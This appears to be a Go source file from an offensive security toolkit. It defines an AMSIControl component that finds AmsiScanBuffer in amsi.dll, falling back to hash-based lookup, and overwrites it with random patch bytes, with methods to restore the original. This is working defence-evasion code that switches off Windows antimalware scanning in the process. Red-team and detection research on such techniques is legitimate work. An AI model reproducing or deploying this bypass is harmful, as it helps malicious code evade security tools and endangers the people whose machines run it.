//go:build windows && amd64

package securityctl

import "fmt"

type AMSIControl struct {
	baseControl
	fp *funcPatch
}

func NewAMSIControl() *AMSIControl {
	return &AMSIControl{baseControl: newBaseControl("amsi")}
}

func (a *AMSIControl) Initialize() error {
	fp, err := resolveFuncFromKnownDlls("amsi.dll", "AmsiScanBuffer")
	if err != nil {
		fp, err = resolveFuncByHash("amsi.dll", "AmsiScanBuffer")
		if err != nil {
			return a.markInitialized(fmt.Errorf("securityctl: amsi: resolve: %w", err))
		}
	}
	a.fp = fp
	return a.markInitialized(nil)
}

func (a *AMSIControl) Enable() error {
	if err := a.markEnabled(); err != nil {
		return err
	}
	if a.fp == nil {
		return fmt.Errorf("securityctl: amsi: not initialized")
	}
	a.fp.patch = randomPatchBytes()
	return applyPatch(a.fp)
}

func (a *AMSIControl) Disable() error {
	a.markDisabled()
	if a.fp == nil {
		return nil
	}
	return restorePatch(a.fp)
}

func (a *AMSIControl) Restore() {
	if a.fp == nil {
		return
	}
	_ = restorePatch(a.fp)
}
